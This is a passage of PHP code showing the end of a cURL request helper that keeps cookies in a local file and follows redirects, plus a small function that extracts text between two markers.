        file_put_contents("cookie.txt", "");
    }
    curl_setopt ($ch, CURLOPT_COOKIEJAR, "cookie.txt");
    curl_setopt ($ch, CURLOPT_COOKIEFILE, "cookie.txt");
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    $result = curl_exec($ch);
    //$statusCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    return $result;
}

function get_between($string,$start,$end) {
    $string = " ".$string;
    $ini = strpos($string, $start);
    if($ini==0) return "";
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;

    return substr($string, $ini, $len);
}
</body></html>